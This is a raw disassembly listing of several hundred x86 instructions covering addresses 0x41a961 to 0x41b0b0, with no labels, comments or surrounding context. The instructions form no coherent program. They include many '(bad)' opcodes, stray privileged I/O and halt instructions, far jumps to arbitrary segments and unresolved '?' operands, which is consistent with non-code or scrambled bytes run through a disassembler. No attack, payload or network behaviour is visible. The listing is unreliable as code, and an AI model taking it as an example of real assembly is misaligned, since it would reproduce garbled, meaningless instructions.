  41a961:	mov    WORD PTR [edi-0x1d36cb89],cs
  41a967:	adc    al,0xab
  41a969:	outs   dx,DWORD PTR ds:[esi]
  41a96a:	or     BYTE PTR ds:0xd5a35f63,bh
  41a970:	jo     0x41a9a0
  41a972:	(bad)  
  41a973:	and    eax,0xdc780549
  41a978:	sub    al,0xea
  41a97a:	jle    0x41a9d7
  41a97c:	push   edx
  41a97d:	mov    ds:0xf3316cfc,eax
  41a982:	popa   
  41a983:	fisub  DWORD PTR [esi]
  41a985:	stos   DWORD PTR es:[edi],eax
  41a986:	loop   0x41a950
  41a988:	push   0xd77894fc
  41a98d:	xor    BYTE PTR [edx+0x3b],ch
  41a990:	mov    bh,0xf3
  41a992:	dec    eax
  41a993:	test   al,0xe3
  41a995:	adc    al,0x79
  41a997:	les    edi,FWORD PTR [edi+0x4480f668]
  41a99d:	jnp    0x41a97b
  41a99f:	jbe    0x41a990
  41a9a1:	stos   BYTE PTR es:[edi],al
  41a9a2:	lods   eax,DWORD PTR ds:[esi]
  41a9a3:	xchg   ebp,eax
  41a9a4:	pop    edx
  41a9a5:	psubusb mm3,mm5
  41a9a8:	es cmp dl,al
  41a9ab:	lods   eax,DWORD PTR ds:[esi]
  41a9ac:	shl    eax,0x67
  41a9af:	inc    eax
  41a9b0:	pop    edx
  41a9b1:	pop    ebp
  41a9b2:	hlt    
  41a9b3:	loop   0x41a9d2
  41a9b5:	jle    0x41a950
  41a9b7:	lods   al,BYTE PTR ds:[esi]
  41a9b8:	cmp    eax,0x2d25aa21
  41a9bd:	ds xchg bl,ah
  41a9c0:	pushf  
  41a9c1:	xlat   BYTE PTR ds:[ebx]
  41a9c2:	pop    ebp
  41a9c3:	div    BYTE PTR [ebx]
  41a9c5:	out    dx,eax
  41a9c6:	xchg   esp,eax
  41a9c7:	sub    eax,0x13f190b9
  41a9cc:	xor    ebx,ebx
  41a9ce:	jns    0x41aa32
  41a9d0:	xchg   edx,eax
  41a9d1:	push   esi
  41a9d2:	and    dh,cl
  41a9d4:	and    BYTE PTR [ecx+0xc],bh
  41a9d7:	mov    ebx,esp
  41a9d9:	shl    DWORD PTR [ecx-0x56807f01],0x1b
  41a9e0:	add    BYTE PTR [eax+0x44],ch
  41a9e3:	lea    ecx,[ebx]
  41a9e5:	mov    bl,0xb6
  41a9e7:	ficomp DWORD PTR [esi+ecx*4+0x40c864e3]
  41a9ee:	jns    0x41aa0b
  41a9f0:	call   0x5e0bb6d3
  41a9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f6:	int3   
  41a9f7:	push   ebp
  41a9f8:	push   0x6
  41a9fa:	adc    al,0x6f
  41a9fc:	pop    edi
  41a9fd:	mov    WORD PTR ss:[edx],gs
  41aa00:	mov    ds,WORD PTR [ebp-0x25776670]
  41aa06:	gs or  al,0xf1
  41aa09:	rcr    BYTE PTR [ebp-0x35],0x76
  41aa0d:	push   0xffffffee
  41aa0f:	xor    edi,ebp
  41aa11:	mov    al,ds:0xc2678cd9
  41aa16:	js     0x41aa97
  41aa18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa19:	lock mov cl,BYTE PTR [esi-0x6b]
  41aa1d:	add    eax,0xb55ada0c
  41aa22:	(bad)  
  41aa23:	cmp    esp,DWORD PTR [esi+eax*2+0x7a]
  41aa27:	sub    esp,eax
  41aa29:	pop    ecx
  41aa2b:	and    ebp,esp
  41aa2d:	call   0xcad0:0xb30e0361
  41aa34:	fdiv   DWORD PTR [esi]
  41aa36:	retf   
  41aa37:	mov    bl,BYTE PTR [ebx]
  41aa39:	jl     0x41aa3b
  41aa3b:	ret    
  41aa3c:	xchg   esi,eax
  41aa3d:	sti    
  41aa3e:	loop   0x41aa1e
  41aa40:	adc    BYTE PTR [edx-0x6cbbcdbf],0x5f
  41aa47:	sub    dh,BYTE PTR [esi]
  41aa49:	sti    
  41aa4a:	mov    al,ds:0xebbdac78
  41aa4f:	(bad)  
  41aa50:	pop    ss
  41aa51:	jno    0x41a9ec
  41aa53:	dec    ecx
  41aa54:	or     DWORD PTR [ebx],edi
  41aa56:	mov    ds:0x8c647e9a,al
  41aa5b:	xor    DWORD PTR [ecx],ebx
  41aa5d:	pop    esp
  41aa5e:	and    edi,ebx
  41aa60:	ins    BYTE PTR es:[edi],dx
  41aa61:	repz fidiv WORD PTR [edi]
  41aa64:	popa   
  41aa65:	adc    BYTE PTR [edx],bl
  41aa67:	pop    esi
  41aa68:	add    eax,0xf2043599
  41aa6d:	mov    eax,ds:0x37439430
  41aa72:	or     ebx,ebx
  41aa74:	push   es
  41aa75:	loop   0x41aa90
  41aa77:	mov    esp,0xa5329246
  41aa7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa7d:	(bad)  
  41aa7f:	sub    al,0xd8
  41aa81:	out    0xe1,al
  41aa83:	dec    ebp
  41aa84:	add    DWORD PTR [ebp-0x4f],edi
  41aa87:	test   al,0x33
  41aa89:	std    
  41aa8a:	mov    ?,ebp
  41aa8c:	add    esi,ecx
  41aa8e:	test   BYTE PTR [ecx-0x47908924],al
  41aa94:	push   ebp
  41aa95:	lods   eax,DWORD PTR ds:[esi]
  41aa96:	or     ebp,ecx
  41aa98:	mov    ds:0xf462aff3,eax
  41aa9d:	fstp   QWORD PTR [edx-0x3f9f59de]
  41aaa3:	push   edi
  41aaa4:	mov    ebx,0xaa195bca
  41aaa9:	test   BYTE PTR [eax-0x4a9dfede],dh
  41aaaf:	or     BYTE PTR [edx-0x6b88b9e6],0x3b
  41aab6:	mov    esp,0x113bc757
  41aabb:	sub    bh,dh
  41aabd:	pop    esp
  41aabe:	mov    DWORD PTR [eax],edi
  41aac0:	test   eax,0xd63b17
  41aac5:	cmp    eax,0xae7e5d61
  41aaca:	clc    
  41aacb:	mov    cl,0xb8
  41aacd:	outs   dx,BYTE PTR ds:[esi]
  41aace:	mov    al,ds:0x97aa2f45
  41aad3:	or     al,0xdd
  41aad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad6:	(bad)  
  41aad7:	and    BYTE PTR [edx],ah
  41aad9:	push   ebx
  41aada:	jg     0x41ab4c
  41aadc:	pop    esi
  41aadd:	ret    
  41aade:	inc    edx
  41aadf:	repz out dx,al
  41aae1:	mov    al,0x64
  41aae3:	lea    edx,[ecx+0x170e29d2]
  41aae9:	cmc    
  41aaea:	repz fstp TBYTE PTR [esi-0x7d]
  41aaee:	xor    BYTE PTR [ecx+0x622f9d2],0xe3
  41aaf5:	aaa    
  41aaf6:	push   esi
  41aaf7:	ss retf 0xa46e
  41aafb:	scas   eax,DWORD PTR es:[edi]
  41aafc:	mov    BYTE PTR [edx+0x47],bh
  41aaff:	nop
  41ab00:	push   esp
  41ab01:	push   esi
  41ab02:	adc    BYTE PTR [edi+0x70],ch
  41ab05:	jae    0x41aa92
  41ab07:	cmovbe ebp,DWORD PTR [ecx]
  41ab0a:	push   edx
  41ab0b:	mov    al,ds:0x9bb8e5a8
  41ab10:	das    
  41ab11:	lea    esp,[edx]
  41ab13:	mov    eax,ds:0x704e5fe7
  41ab18:	jns    0x41ab74
  41ab1a:	fs stos DWORD PTR es:[edi],eax
  41ab1c:	sbb    DWORD PTR [edx],eax
  41ab1e:	adc    eax,0xa475ff30
  41ab23:	mov    BYTE PTR [eax+0x37881492],al
  41ab29:	mov    ds:0x947e8635,eax
  41ab2e:	mov    ebp,0x1cbbb079
  41ab33:	pop    edx
  41ab34:	jo     0x41aae9
  41ab36:	push   edi
  41ab37:	lds    edi,FWORD PTR [esi+0x532d2e4f]
  41ab3d:	fwait
  41ab3e:	push   es
  41ab3f:	mov    al,ds:0xba517a1f
  41ab44:	xor    BYTE PTR [ecx+esi*4],bl
  41ab47:	mov    ds:0xc5a715b8,al
  41ab4c:	mov    al,BYTE PTR [edx]
  41ab4e:	(bad)  
  41ab4f:	arpl   WORD PTR [esi+eax*2-0xf],cx
  41ab53:	int    0x77
  41ab55:	push   edi
  41ab56:	pop    ebp
  41ab57:	pop    edi
  41ab58:	push   esp
  41ab59:	popa   
  41ab5a:	mov    ah,0x3b
  41ab5c:	jno    0x41aaed
  41ab5e:	(bad)  
  41ab5f:	loopne 0x41aba2
  41ab61:	loope  0x41aaf2
  41ab63:	mov    ebp,0x8f820e91
  41ab68:	jecxz  0x41ab04
  41ab6a:	xchg   edi,eax
  41ab6b:	cs aad 0xbd
  41ab6e:	cli    
  41ab6f:	je     0x41ab34
  41ab71:	xor    DWORD PTR [esp+ecx*4-0x4b],edx
  41ab75:	ret    0xb2d2
  41ab78:	retf   0x623f
  41ab7b:	inc    eax
  41ab7c:	aad    0x3c
  41ab7e:	mov    ch,0x7d
  41ab80:	lahf   
  41ab81:	cmp    eax,0x2fafa782
  41ab86:	xchg   esp,eax
  41ab87:	in     al,dx
  41ab88:	and    DWORD PTR [eax+ebx*8],esi
  41ab8b:	dec    edi
  41ab8c:	mov    dh,0x3c
  41ab8e:	test   DWORD PTR [edi+0x15e44271],0x616f7d9e
  41ab98:	cmc    
  41ab99:	imul   ebx,DWORD PTR ds:0xdee3186,0x57629d2b
  41aba3:	mov    bh,0x3f
  41aba5:	xchg   ebx,eax
  41aba6:	mov    bl,0xb4
  41aba8:	cs push ebx
  41abaa:	shl    bl,cl
  41abac:	in     eax,dx
  41abad:	inc    esi
  41abae:	ror    BYTE PTR [eax-0x1],0x63
  41abb2:	fsubr  DWORD PTR [eax-0x3a8a8445]
  41abb8:	fcomp  QWORD PTR [eax-0x27]
  41abbb:	push   0xffffffdc
  41abbd:	xor    ch,BYTE PTR [edi+0x37127bfd]
  41abc3:	aam    0x9
  41abc5:	hlt    
  41abc6:	mov    esp,0x55da564f
  41abcb:	shl    DWORD PTR [edx+0x6e25211],1
  41abd1:	out    dx,eax
  41abd2:	cld    
  41abd3:	pop    edi
  41abd4:	xchg   ecx,eax
  41abd5:	pop    ss
  41abd6:	inc    ebp
  41abd7:	(bad)  [edi+edi*2-0x3cdb1654]
  41abde:	hlt    
  41abdf:	inc    eax
  41abe0:	outs   dx,BYTE PTR ds:[esi]
  41abe1:	popf   
  41abe2:	or     ch,BYTE PTR [ebp-0x59b2dc74]
  41abe8:	rcr    BYTE PTR [ebx+0x784e8ab5],1
  41abee:	loop   0x41ac3d
  41abf0:	push   edx
  41abf1:	nop
  41abf2:	es xchg ebp,eax
  41abf4:	cld    
  41abf5:	sar    BYTE PTR [ecx-0x19],1
  41abf8:	inc    edi
  41abf9:	jp     0x41abd7
  41abfb:	mov    esi,ebx
  41abfd:	(bad)  
  41abff:	pop    ds
  41ac00:	and    BYTE PTR [edx-0x43b43312],dl
  41ac06:	loope  0x41ac6d
  41ac08:	loopne 0x41ab9b
  41ac0a:	fnstsw ax
  41ac0c:	dec    ebx
  41ac0d:	cmp    DWORD PTR [eax+0xb],esp
  41ac10:	gs pop edi
  41ac12:	inc    ebx
  41ac13:	pop    esp
  41ac14:	pop    ecx
  41ac15:	mov    eax,ds:0x532b95a2
  41ac1a:	mov    eax,ds:0xdac9831f
  41ac1f:	daa    
  41ac20:	shl    DWORD PTR [ebx+0x40],1
  41ac23:	popa   
  41ac24:	xchg   ecx,eax
  41ac25:	xchg   ebp,eax
  41ac26:	xchg   ecx,eax
  41ac27:	fisttp DWORD PTR [edx]
  41ac29:	nop
  41ac2a:	sub    BYTE PTR [edi-0x1c],al
  41ac2d:	cmp    al,0xdd
  41ac2f:	lahf   
  41ac30:	xchg   BYTE PTR [esi-0x17],cl
  41ac33:	(bad)  
  41ac34:	jns    0x41acaa
  41ac36:	or     dh,ch
  41ac38:	and    eax,0x5654fc25
  41ac3d:	ror    DWORD PTR [edx],1
  41ac3f:	repnz sbb BYTE PTR [ecx+esi*8],ah
  41ac43:	cdq    
  41ac44:	sbb    DWORD PTR [esi+esi*8+0xb],esp
  41ac48:	inc    esi
  41ac49:	xor    dl,cl
  41ac4b:	cwde   
  41ac4c:	xchg   ecx,eax
  41ac4d:	xor    DWORD PTR [esi],edx
  41ac4f:	sar    DWORD PTR [esi],0x93
  41ac52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac53:	adc    bl,bl
  41ac55:	ror    ecx,1
  41ac57:	lahf   
  41ac58:	lods   al,BYTE PTR ds:[esi]
  41ac59:	repnz mov DWORD PTR [ebx-0x4806b9d5],esi
  41ac60:	es and eax,ebp
  41ac63:	adc    eax,esp
  41ac65:	fild   QWORD PTR [ebx]
  41ac67:	sahf   
  41ac68:	fdiv   QWORD PTR [esi+edi*8]
  41ac6b:	ret    
  41ac6c:	fcomp  QWORD PTR [esi-0xbb2baf8]
  41ac72:	lds    esi,FWORD PTR [eax+0x32f512d7]
  41ac78:	repnz xor eax,0xde59da2f
  41ac7e:	retf   0x3a7c
  41ac81:	shr    DWORD PTR [ebx+0x3f],cl
  41ac84:	cmp    DWORD PTR [edi+eax*8],esi
  41ac87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac88:	gs inc edx
  41ac8a:	sub    al,BYTE PTR ds:0x3cc77a42
  41ac90:	loop   0x41acb6
  41ac92:	jp     0x41ac1b
  41ac94:	sub    esp,0x3f
  41ac97:	leave  
  41ac98:	sub    ebx,DWORD PTR [ebx-0x1a771bf1]
  41ac9e:	mov    ds:0xa4230065,eax
  41aca3:	pop    edx
  41aca4:	mov    ebp,0x8c5df4ba
  41aca9:	lds    eax,FWORD PTR [eax+0x5b]
  41acac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acad:	push   cs
  41acae:	sub    DWORD PTR [eax-0x69],edx
  41acb1:	or     al,0x44
  41acb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acb4:	aaa    
  41acb5:	dec    ecx
  41acb6:	push   cs
  41acb7:	ins    BYTE PTR es:[edi],dx
  41acb8:	add    BYTE PTR [edx+0x48d89d44],ah
  41acbe:	cli    
  41acbf:	cmp    al,0xbc
  41acc1:	mov    al,ds:0x14f32412
  41acc6:	ins    BYTE PTR es:[edi],dx
  41acc7:	jmp    0x1a69:0xde17f2a6
  41acce:	dec    edx
  41accf:	dec    ecx
  41acd0:	sbb    ah,BYTE PTR [ebx-0x4d52df76]
  41acd6:	mov    ?,WORD PTR [eax+0x59fabe4c]
  41acdc:	leave  
  41acdd:	adc    BYTE PTR [eax+0x2a],ch
  41ace0:	push   ebp
  41ace1:	cld    
  41ace2:	out    dx,eax
  41ace3:	and    ah,BYTE PTR [ebx+0x3507b414]
  41ace9:	jae    0x41ac85
  41aceb:	daa    
  41acec:	and    dh,ah
  41acee:	push   eax
  41acef:	in     al,dx
  41acf0:	xor    DWORD PTR [ecx+0x3f],ebp
  41acf3:	int3   
  41acf4:	push   0xffffffec
  41acf6:	lea    eax,[edx]
  41acf8:	inc    eax
  41acf9:	cwde   
  41acfa:	(bad)  
  41acfb:	pop    edx
  41acfc:	or     eax,0x33b8cef9
  41ad01:	stos   BYTE PTR es:[edi],al
  41ad02:	mov    ecx,0x162580cd
  41ad07:	adc    DWORD PTR [ebp-0x18],ebx
  41ad0a:	cs mov ebx,0x699fdefd
  41ad10:	mov    dh,0xff
  41ad12:	xlat   BYTE PTR gs:[ebx]
  41ad14:	iret   
  41ad15:	jb     0x41ad86
  41ad17:	jbe    0x41ad23
  41ad19:	pop    edi
  41ad1a:	pop    ds
  41ad1b:	jge    0x41ad6e
  41ad1d:	xchg   DWORD PTR [eax],edi
  41ad1f:	sbb    BYTE PTR [eax],dl
  41ad21:	mov    WORD PTR [ecx],es
  41ad23:	(bad)  
  41ad24:	xor    DWORD PTR [edx+0x616b4402],edi
  41ad2a:	les    eax,FWORD PTR [ebx-0x41]
  41ad2d:	mov    esp,0x1db295ed
  41ad32:	fadd   QWORD PTR [ecx]
  41ad34:	adc    al,0x45
  41ad36:	shl    ecx,cl
  41ad38:	sub    cl,BYTE PTR [ebx]
  41ad3a:	sbb    eax,0xa49177e6
  41ad3f:	bound  eax,QWORD PTR [edx-0xe837d9a]
  41ad45:	js     0x41ad08
  41ad47:	pop    eax
  41ad48:	pop    esp
  41ad49:	push   esp
  41ad4a:	clc    
  41ad4b:	sti    
  41ad4c:	outs   dx,BYTE PTR ds:[esi]
  41ad4d:	or     eax,0xd1e6045b
  41ad52:	ins    BYTE PTR es:[edi],dx
  41ad53:	fcomp  QWORD PTR cs:[ecx]
  41ad56:	push   0xf39e8e6b
  41ad5b:	popf   
  41ad5c:	pop    ebp
  41ad5d:	das    
  41ad5e:	adc    eax,DWORD PTR [esi]
  41ad60:	sti    
  41ad61:	sub    eax,0x40e6bcbe
  41ad66:	pop    edi
  41ad67:	mov    al,0x7
  41ad69:	nop
  41ad6a:	pop    esp
  41ad6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad6c:	adc    BYTE PTR [ecx],dh
  41ad6e:	out    0x87,al
  41ad70:	sub    BYTE PTR [eax+0x477e6b8b],dl
  41ad76:	loopne 0x41ad39
  41ad78:	inc    edi
  41ad79:	or     BYTE PTR [eax],cl
  41ad7b:	adc    DWORD PTR ds:[ecx-0x1c],ecx
  41ad7f:	repz push edx
  41ad81:	scas   eax,DWORD PTR es:[edi]
  41ad82:	sbb    eax,0x1d8e8d85
  41ad87:	jns    0x41ade7
  41ad89:	mov    cl,0x3d
  41ad8b:	jmp    0xd426:0x2e61a75a
  41ad92:	cmp    BYTE PTR [edx],bl
  41ad94:	dec    eax
  41ad95:	xor    ch,ah
  41ad97:	adc    al,0x1e
  41ad99:	cmp    al,0x9
  41ad9b:	repz cli 
  41ad9d:	or     al,0x1b
  41ad9f:	pop    ecx
  41ada0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada1:	fiadd  DWORD PTR [edx+0x2]
  41ada4:	add    eax,ecx
  41ada6:	lods   al,BYTE PTR ds:[esi]
  41ada7:	addr16 jae 0x41ad94
  41adaa:	add    ah,BYTE PTR [esi+0x4c077e15]
  41adb0:	pushf  
  41adb1:	ds in  eax,dx
  41adb3:	sahf   
  41adb4:	sti    
  41adb5:	xchg   esp,eax
  41adb6:	adc    al,0x54
  41adb8:	pop    ebx
  41adb9:	in     al,0x6f
  41adbb:	gs popaw 
  41adbe:	or     eax,DWORD PTR [edx-0x29ebc62e]
  41adc4:	cmp    bl,BYTE PTR [edx+0x43804877]
  41adca:	loopne 0x41ad9b
  41adcc:	push   ds
  41adcd:	jge    0x41adb7
  41adcf:	sbb    al,0xeb
  41add1:	cmp    eax,0xc3f6450a
  41add6:	shl    dl,0x66
  41add9:	push   ebx
  41addb:	pop    es
  41addc:	jmp    0xe93b8969
  41ade1:	nop
  41ade2:	add    eax,0x94c44e1e
  41ade7:	cmp    esi,DWORD PTR [ecx-0x7a]
  41adea:	mov    al,0x2f
  41adec:	sub    ebx,edx
  41adee:	dec    edi
  41adef:	nop
  41adf0:	leave  
  41adf1:	div    BYTE PTR [esi+0x4b]
  41adf4:	retf   0x8b19
  41adf7:	xchg   esp,eax
  41adf8:	scas   eax,DWORD PTR es:[edi]
  41adf9:	xchg   ebx,eax
  41adfa:	jl     0x41ad87
  41adfc:	pop    ds
  41adfd:	sub    BYTE PTR [edi-0xe],cl
  41ae00:	cwde   
  41ae01:	daa    
  41ae02:	in     al,dx
  41ae03:	retf   
  41ae04:	mov    eax,ds:0xcdfdbace
  41ae09:	outs   dx,DWORD PTR ds:[esi]
  41ae0a:	pop    es
  41ae0b:	or     bh,bh
  41ae0d:	cmp    DWORD PTR [esi],0xffffff90
  41ae10:	xor    ecx,esi
  41ae12:	sbb    esi,DWORD PTR [edx]
  41ae14:	sub    BYTE PTR [eax+ebx*4+0x7ca1a338],dh
  41ae1b:	sbb    DWORD PTR [ebx],ebp
  41ae1d:	das    
  41ae1e:	fsub   QWORD PTR [ecx]
  41ae20:	xchg   edi,eax
  41ae21:	jbe    0x41ae99
  41ae23:	or     DWORD PTR [ecx-0x70],ecx
  41ae26:	push   esi
  41ae27:	int    0xda
  41ae29:	adc    DWORD PTR [edx-0x5dcc113f],0xfffffff9
  41ae30:	fsub   st(0),st
  41ae32:	scas   al,BYTE PTR es:[edi]
  41ae33:	mov    BYTE PTR [edx+0x25],cl
  41ae36:	pop    ss
  41ae37:	mov    eax,ds:0xe86680de
  41ae3c:	mov    ecx,0x1342a58c
  41ae41:	push   edx
  41ae42:	pop    esi
  41ae43:	iret   
  41ae44:	inc    eax
  41ae45:	dec    esp
  41ae46:	aad    0x75
  41ae48:	fldenv [edi+edi*4]
  41ae4b:	ja     0x41ae05
  41ae4d:	or     BYTE PTR [ecx+0x6],dl
  41ae50:	push   cs
  41ae51:	dec    ecx
  41ae52:	out    0x61,eax
  41ae54:	idiv   esi
  41ae56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae57:	pop    edx
  41ae58:	pusha  
  41ae59:	repnz push cs
  41ae5b:	adc    al,0xcf
  41ae5d:	cmp    DWORD PTR [esp+edx*1-0x54],ebp
  41ae61:	repnz fbld TBYTE PTR [edi+0x58]
  41ae65:	jmp    0xeb62:0xc16fa2b1
  41ae6c:	dec    ebx
  41ae6d:	dec    esi
  41ae6e:	pushf  
  41ae6f:	mov    bl,0x6b
  41ae71:	sub    al,0x89
  41ae73:	adc    DWORD PTR [eax-0x20],edi
  41ae76:	cmc    
  41ae77:	loope  0x41aeb5
  41ae79:	movaps XMMWORD PTR [edi],xmm7
  41ae7c:	mov    DWORD PTR [esi+0x79],esp
  41ae7f:	jge    0x41aede
  41ae81:	cmp    ah,BYTE PTR [edi-0x55802416]
  41ae87:	scas   al,BYTE PTR es:[edi]
  41ae88:	add    ch,dh
  41ae8a:	xchg   ebp,eax
  41ae8b:	mov    esi,0x4c929a74
  41ae90:	ffreep st(0)
  41ae92:	mov    WORD PTR [ebp-0x18],?
  41ae95:	rol    edx,cl
  41ae97:	sub    eax,0xeace8355
  41ae9c:	inc    esp
  41ae9d:	xchg   edi,eax
  41ae9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae9f:	cdq    
  41aea0:	mov    eax,ds:0xb7b97564
  41aea5:	and    ebx,DWORD PTR [ecx]
  41aea7:	cmp    ecx,DWORD PTR [ebx]
  41aea9:	dec    ebx
  41aeaa:	gs call 0xf8a2:0x336b3bf4
  41aeb2:	pusha  
  41aeb3:	aas    
  41aeb4:	xchg   DWORD PTR [eax-0x6268d073],ebp
  41aeba:	push   es
  41aebb:	(bad)  
  41aebc:	lods   eax,DWORD PTR ds:[esi]
  41aebd:	jne    0x41aefe
  41aebf:	fpatan 
  41aec1:	or     edx,edi
  41aec3:	pop    ebx
  41aec4:	fstp   TBYTE PTR [edx+0x7f1686f7]
  41aeca:	cmp    eax,ecx
  41aecc:	jae    0x41ae95
  41aece:	pop    eax
  41aecf:	pop    ebp
  41aed0:	cdq    
  41aed1:	inc    eax
  41aed2:	or     eax,0x4125f2a6
  41aed7:	xor    eax,0x21
  41aeda:	data16 daa 
  41aedc:	fucomp st(7)
  41aede:	sbb    BYTE PTR [edx+0x1a],dh
  41aee1:	xchg   edx,eax
  41aee2:	retf   
  41aee3:	cmp    DWORD PTR [ecx],ebp
  41aee5:	fdivp  st(6),st
  41aee7:	cli    
  41aee8:	push   ds
  41aee9:	sub    ah,BYTE PTR [esi-0x38]
  41aeec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeed:	sbb    DWORD PTR [edi],esp
  41aeef:	and    DWORD PTR [ecx-0x62207341],edi
  41aef5:	setae  BYTE PTR [esi-0x2b]
  41aef9:	push   es
  41aefa:	mov    ch,BYTE PTR [esi+0x54cba2d9]
  41af00:	pop    ebp
  41af01:	or     eax,0x4cf635c7
  41af06:	adc    eax,0x4401b5ee
  41af0b:	inc    esi
  41af0c:	or     BYTE PTR [edx+0x726d1bf3],cl
  41af12:	sub    al,0x58
  41af14:	enter  0x37ae,0xe3
  41af18:	fwait
  41af19:	push   eax
  41af1a:	cmp    al,0xe5
  41af1c:	pop    ds
  41af1d:	(bad)  
  41af1e:	and    DWORD PTR [ebp+ecx*4-0x60],edi
  41af22:	sbb    bh,0xd7
  41af25:	test   dl,dl
  41af27:	pop    edi
  41af29:	mov    ch,0x1
  41af2b:	push   0xffffff8f
  41af2d:	push   edi
  41af2e:	sti    
  41af2f:	out    dx,al
  41af30:	or     ebx,DWORD PTR [edx+0x2]
  41af33:	mov    DWORD PTR [ecx-0x7f472e6b],edi
  41af39:	dec    eax
  41af3b:	dec    ecx
  41af3c:	cmp    ebp,DWORD PTR [eax+0x715d6dd7]
  41af42:	aaa    
  41af43:	mov    ds:0xd1eaa5d9,eax
  41af48:	and    DWORD PTR [eax],eax
  41af4a:	into   
  41af4b:	adc    BYTE PTR ds:0x73a0b44c,al
  41af51:	test   eax,0xf8d1f31a
  41af56:	mov    esp,0x29694fa0
  41af5b:	add    eax,0x658452a9
  41af60:	ss int3 
  41af62:	out    0xe8,eax
  41af64:	(bad)  
  41af65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af66:	mov    dh,0xb5
  41af68:	test   eax,0x7a400169
  41af6d:	ds aaa 
  41af6f:	dec    edx
  41af70:	icebp  
  41af71:	xchg   ecx,eax
  41af72:	push   es
  41af73:	xchg   ebp,eax
  41af74:	hlt    
  41af75:	outs   dx,DWORD PTR ds:[esi]
  41af76:	add    DWORD PTR [edi-0x3c73077e],edx
  41af7c:	fbstp  TBYTE PTR [ecx+0x368dd369]
  41af82:	dec    esp
  41af83:	sbb    ecx,DWORD PTR [edx+0x4a]
  41af86:	imul   esi,DWORD PTR [edi],0x69
  41af89:	push   es
  41af8a:	ret    
  41af8b:	push   esp
  41af8c:	stos   DWORD PTR es:[edi],eax
  41af8d:	push   0x13
  41af8f:	inc    ecx
  41af90:	sar    edi,cl
  41af92:	jnp    0x41af7e
  41af94:	int    0x1c
  41af96:	or     cl,BYTE PTR [edi+0x784296]
  41af9c:	sbb    bh,BYTE PTR [eax+0x7703d286]
  41afa2:	in     eax,dx
  41afa3:	cmp    eax,0x6f064054
  41afa8:	aam    0x41
  41afaa:	call   0x1091ad72
  41afaf:	or     eax,edx
  41afb1:	fdivr  DWORD PTR [ecx-0x69]
  41afb4:	loope  0x41afea
  41afb6:	sub    bl,BYTE PTR [ebp+0x6f6ab70c]
  41afbc:	in     al,0xc6
  41afbe:	mov    al,0x76
  41afc0:	push   edi
  41afc1:	mov    edx,DWORD PTR [edi-0x118909e8]
  41afc7:	push   ss
  41afc8:	mov    ds:0x843a7d05,eax
  41afcd:	rcl    BYTE PTR [ecx*2+0x349e3dd1],1
  41afd4:	retf   0xe81a
  41afd7:	and    DWORD PTR [ebx],eax
  41afd9:	jmp    0xc0ba:0x8d57b92e
  41afe0:	push   ebx
  41afe1:	adc    DWORD PTR [edi+0x41cb3369],0x83560d0d
  41afeb:	cld    
  41afec:	inc    esp
  41afed:	pushf  
  41afee:	jnp    0x41b016
  41aff0:	or     DWORD PTR [ecx+0x3],0xb7fe56aa
  41aff7:	inc    esi
  41aff8:	cs xchg edx,eax
  41affa:	pop    ss
  41affb:	push   ecx
  41affc:	pushf  
  41affd:	cmp    DWORD PTR [edx-0x3],ebp
  41b000:	jge    0x41b041
  41b002:	mov    WORD PTR [edi+eax*1],?
  41b005:	neg    DWORD PTR [edi+0x3d]
  41b008:	mov    ebp,0x27780e7
  41b00d:	mov    BYTE PTR ss:[esi+0x76],0x0
  41b012:	iret   
  41b013:	test   eax,eax
  41b015:	and    BYTE PTR [esi],ch
  41b017:	cmp    bl,bl
  41b019:	dec    eax
  41b01a:	sbb    eax,0xc3811bd4
  41b01f:	ss dec esi
  41b021:	xlat   BYTE PTR ds:[ebx]
  41b022:	cmc    
  41b023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b024:	mov    eax,0xd474480c
  41b029:	mov    ebx,0xa7d77792
  41b02e:	push   ebx
  41b02f:	ds test eax,0x86892095
  41b035:	out    0x0,eax
  41b037:	adc    DWORD PTR [ebx+0x39],ecx
  41b03a:	add    eax,0x106e5c83
  41b03f:	scas   al,BYTE PTR es:[edi]
  41b040:	cmp    DWORD PTR [ebx-0x451a551],esi
  41b046:	pusha  
  41b047:	mov    bh,0x50
  41b049:	mov    esp,0x1aa55651
  41b04e:	int    0x4c
  41b050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b051:	addr16 xchg ebx,eax
  41b053:	push   ebx
  41b054:	nop
  41b055:	sbb    ah,BYTE PTR [ebx-0x14a5c331]
  41b05b:	stos   BYTE PTR es:[edi],al
  41b05c:	adc    BYTE PTR [edx+0x9],0xc5
  41b060:	fmulp  st(3),st
  41b062:	mov    bl,0x8c
  41b064:	test   ecx,edx
  41b066:	out    0xf7,al
  41b068:	pop    es
  41b069:	or     BYTE PTR [edx-0x7067c3d2],ah
  41b06f:	lods   al,BYTE PTR ds:[esi]
  41b070:	mov    ds:0x608bd977,al
  41b075:	xchg   esi,eax
  41b076:	bound  esp,QWORD PTR [ebx-0x1]
  41b079:	jno    0x41b087
  41b07b:	jo     0x41b034
  41b07d:	or     BYTE PTR [esi-0x13c27c3c],ah
  41b083:	lock jge 0xbcfedd93
  41b08a:	rol    ebx,1
  41b08c:	addr16 in eax,0xeb
  41b08f:	popa   
  41b090:	imul   esp,esi,0xe44a0b83
  41b096:	and    al,0xaf
  41b098:	sahf   
  41b099:	jne    0x41b0b1
  41b09b:	mov    ebp,0x2a91dddd
  41b0a0:	add    eax,0x6d60ebbf
  41b0a5:	mov    ds:0xd84c2a46,al
  41b0aa:	scas   eax,DWORD PTR es:[edi]
  41b0ab:	test   eax,0x84a73d73
  41b0b0:	bound  edx,QWORD PTR [edi-0x21]
